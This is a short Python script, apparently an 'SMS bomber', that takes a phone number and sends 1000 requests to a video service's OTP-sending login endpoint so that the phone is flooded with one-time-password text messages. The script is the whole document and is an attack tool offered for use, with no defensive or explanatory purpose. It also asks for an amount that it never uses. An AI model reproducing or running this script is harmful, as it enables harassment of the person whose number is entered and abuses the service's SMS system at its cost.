import requests
# GET
number=str(input("Enter Your Number"))
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
amount=int(input("Enter Your Amount:"))
for i in range(1000):
  requests.get(api)
  print(str(i+1)+" SMS SENT")


